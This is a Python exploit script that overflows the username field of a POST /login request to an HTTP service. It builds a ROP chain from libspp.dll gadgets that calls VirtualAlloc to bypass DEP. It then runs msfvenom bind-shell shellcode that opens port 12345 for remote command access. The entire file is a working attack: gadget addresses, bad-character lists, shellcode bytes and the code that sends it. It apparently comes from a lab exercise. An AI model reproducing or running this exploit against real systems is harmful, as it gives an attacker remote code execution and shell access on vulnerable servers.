#!/usr/bin/python 
import socket 
import sys 
import struct 

server = "127.0.0.1" 
port = 80 
CRASH = 1500 
OFFSET = 780

#\x00\x0d\x0a\x25\x26\x2b\x3d
rop_nop = struct.pack("<I",0x1001111e) #  : ret | ascii {PAGE_EXECUTE_READ} [libspp.dll]

#---------------------------------------------------------------------#
 #GOAL       VirtualAlloc                                         
# EAX 90909090 => Nop                                                 
# ECX 00000040 => flProtect                                          
# EDX 00001000 => flAllocationType                                    
# EBX 00000001 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..) DONE   !py mona jmp -r esp -cpb '\x00\x0d\x0a\x25\x26\x2b\x3d'                    
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of VirtualAlloc         
# EDI RETN => ROP-Nop same as EIP          !py mona find -type instr -s "retn" -m libspp.dll -cpb "\x00\x0d\x0a\x25\x26\x2b\x3d"                       
#---------------------------------------------------------------------#


#EAX
eax = struct.pack("<I",0x1012b413)  # POP EAX # RETN    ** [libspp.dll] **  
eax += struct.pack("<I",0x90909090)  

#ECX 
ecx = struct.pack("<I",0x1012b413)  # POP EAX # RETN    ** [libspp.dll] ** 
ecx += struct.pack("<I",0xffffffc0) #-40
ecx += struct.pack("<I",0x100c1586)  # NEG EAX # RETN    ** [libspp.dll] **   |
ecx += struct.pack("<I",0x100baecb)  # XCHG EAX,ECX # RETN    ** [libspp.dll] **

#EDX - 
edx = struct.pack("<I",0x1012b413)  # POP EAX # RETN    ** [libspp.dll] **
edx += struct.pack("<I",0xffffefff) # -1001
edx += struct.pack("<I",0x101229f2)  # INC EAX # RETN    ** [libspp.dll] ** 
edx += struct.pack("<I",0x100c1586)  # NEG EAX # RETN    ** [libspp.dll] **   |
edx += struct.pack("<I",0x100cb4d4)  # XCHG EAX,EDX # RETN    ** [libspp.dll] ** 

#EBX - 
ebx = struct.pack("<I",0x1013ac5a)  # INC EBX # XOR EDX,EDX # RETN    **

#EBP - 
ebp = struct.pack("<I",0x10141b4f) # POP EBP # RETN    ** [libspp.dll] ** 
ebp += struct.pack("<I",0x10090c83)  # jmp esp |  {PAGE_EXECUTE_READ} [libspp.dll]

#ESI - V
esi = struct.pack("<I",0x1012b413)  # POP EAX # RETN    ** [libspp.dll] **
esi += struct.pack("<I",0x10168074) # poi -> KERNEL32!GetDriveTypeA
esi += struct.pack("<I",0x1014dc4c)  # MOV EAX,DWORD PTR [EAX] # RETN    ** [libspp.dll] **  
esi += struct.pack("<I",0x10141b4f) # POP EBP # RETN    ** [libspp.dll] **
esi += struct.pack("<I",0xffff7de0) # -8820
esi += struct.pack("<I",0x100fcd71)  # ADD EAX,EBP # DEC ECX # RETN    **
esi += rop_nop
esi += struct.pack("<I",0x1008c696)  # XCHG EAX,ESI # ADC EAX,DWORD PTR [EAX] # ADD BYTE PTR [EDI+5EH],BL # ADD ESP,44 # RETN 0x08
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += struct.pack("<I",0x41414141)
esi += rop_nop # retn 0x8
esi += rop_nop # retn 0x8
esi += rop_nop # retn 0x8

#EDI
edi = struct.pack("<I",0x10064a0f)  # POP EDI # RETN    ** [libspp.dll] **  
edi += rop_nop

#PUSHAD
pushad = struct.pack("<I",0x10109ed2)  # PUSHAD # RETN    ** [libspp.dll] ** )

#msfvenom -p windows/shell_bind_tcp LPORT=12345 -f python -v shellcode -b '\x00\x0d\x0a\x25\x26\x2b\x3d'
shellcode =  b""
shellcode += b"\xba\x06\xd6\x99\xf7\xda\xc1\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x53\x31\x50\x12\x03\x50\x12"
shellcode += b"\x83\xee\x2a\x7b\x02\x12\x3a\xfe\xed\xea\xbb"
shellcode += b"\x9f\x64\x0f\x8a\x9f\x13\x44\xbd\x2f\x57\x08"
shellcode += b"\x32\xdb\x35\xb8\xc1\xa9\x91\xcf\x62\x07\xc4"
shellcode += b"\xfe\x73\x34\x34\x61\xf0\x47\x69\x41\xc9\x87"
shellcode += b"\x7c\x80\x0e\xf5\x8d\xd0\xc7\x71\x23\xc4\x6c"
shellcode += b"\xcf\xf8\x6f\x3e\xc1\x78\x8c\xf7\xe0\xa9\x03"
shellcode += b"\x83\xba\x69\xa2\x40\xb7\x23\xbc\x85\xf2\xfa"
shellcode += b"\x37\x7d\x88\xfc\x91\x4f\x71\x52\xdc\x7f\x80"
shellcode += b"\xaa\x19\x47\x7b\xd9\x53\xbb\x06\xda\xa0\xc1"
shellcode += b"\xdc\x6f\x32\x61\x96\xc8\x9e\x93\x7b\x8e\x55"
shellcode += b"\x9f\x30\xc4\x31\xbc\xc7\x09\x4a\xb8\x4c\xac"
shellcode += b"\x9c\x48\x16\x8b\x38\x10\xcc\xb2\x19\xfc\xa3"
shellcode += b"\xcb\x79\x5f\x1b\x6e\xf2\x72\x48\x03\x59\x1b"
shellcode += b"\xbd\x2e\x61\xdb\xa9\x39\x12\xe9\x76\x92\xbc"
shellcode += b"\x41\xfe\x3c\x3b\xa5\xd5\xf9\xd3\x58\xd6\xf9"
shellcode += b"\xfa\x9e\x82\xa9\x94\x37\xab\x21\x64\xb7\x7e"
shellcode += b"\xdf\x6c\x1e\xd1\xc2\x91\xe0\x81\x42\x39\x89"
shellcode += b"\xcb\x4c\x66\xa9\xf3\x86\x0f\x42\x0e\x29\x1f"
shellcode += b"\xaa\x87\xcf\x35\xdc\xc1\x58\xa1\x1e\x36\x51"
shellcode += b"\x56\x60\x1c\xc9\xf0\x29\x76\xce\xff\xa9\x5c"
shellcode += b"\x78\x97\x21\xb3\xbc\x86\x35\x9e\x94\xdf\xa2"
shellcode += b"\x54\x75\x92\x53\x68\x5c\x44\xf7\xfb\x3b\x94"
shellcode += b"\x7e\xe0\x93\xc3\xd7\xd6\xed\x81\xc5\x41\x44"
shellcode += b"\xb7\x17\x17\xaf\x73\xcc\xe4\x2e\x7a\x81\x51"
shellcode += b"\x15\x6c\x5f\x59\x11\xd8\x0f\x0c\xcf\xb6\xe9"
shellcode += b"\xe6\xa1\x60\xa0\x55\x68\xe4\x35\x96\xab\x72"
shellcode += b"\x3a\xf3\x5d\x9a\x8b\xaa\x1b\xa5\x24\x3b\xac"
shellcode += b"\xde\x58\xdb\x53\x35\xd9\xeb\x19\x17\x48\x64"
shellcode += b"\xc4\xc2\xc8\xe9\xf7\x39\x0e\x14\x74\xcb\xef"
shellcode += b"\xe3\x64\xbe\xea\xa8\x22\x53\x87\xa1\xc6\x53"
shellcode += b"\x34\xc1\xc2"

rop = esi
rop += ebp
rop += ebx
rop += edx
rop += ecx
rop += eax
rop += edi
rop += pushad

payload = b"A" * OFFSET
payload += rop_nop
payload += rop_nop
payload += rop
payload += b"\x90" * 50
payload += shellcode
payload += b"C" * (CRASH - len(payload))


content = b"username=" + payload + b"&password=A"  
buffer = b"POST /login HTTP/1.1\r\n" 
buffer += b"Host: " + server.encode() + b"\r\n" 
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" 
buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" 
buffer += b"Accept-Language: en-US,en;q=0.5\r\n" 
buffer += b"Referer: http://10.11.0.22/login\r\n" 
buffer += b"Connection: close\r\n" 
buffer += b"Content-Type: application/x-www-form-urlencoded\r\n" 
buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n" 
buffer += b"\r\n" 
buffer += content

print("Sending evil buffer...") 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((server, port)) 
s.send(buffer) 
s.close() 

print("Done!") 
